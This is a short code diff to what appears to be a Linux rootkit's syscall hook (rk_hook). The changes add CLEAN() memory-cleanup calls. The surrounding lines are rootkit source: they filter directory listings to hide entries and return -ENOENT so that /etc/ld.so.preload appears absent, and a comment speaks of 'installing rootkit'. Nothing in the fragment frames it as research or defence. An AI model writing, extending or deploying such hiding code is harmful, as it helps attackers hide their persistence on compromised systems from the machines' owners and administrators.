@@ -374,6 +374,7 @@ static long rk_hook(long a1, long a2, long a3,
                     bpos += d->d_reclen;
                 }
             }
+            CLEAN(ld_so_preload);
             memcpy(dirp, tmpbuf, valid_len);
             return valid_len;
         }
@@ -396,8 +397,11 @@ static long rk_hook(long a1, long a2, long a3,
             if (!strcmp(path, ld)) {
                // TODO: Return backup if /etc/ld.so.preload already existed 
                // prior to installing rootkit 
+                CLEAN(ld);
                 return -ENOENT;
             }
+            CLEAN(ld);
+            break;
         }
         default: 
             // DEBUG_MSG("output from hook_function: syscall number %ld\n", a1);
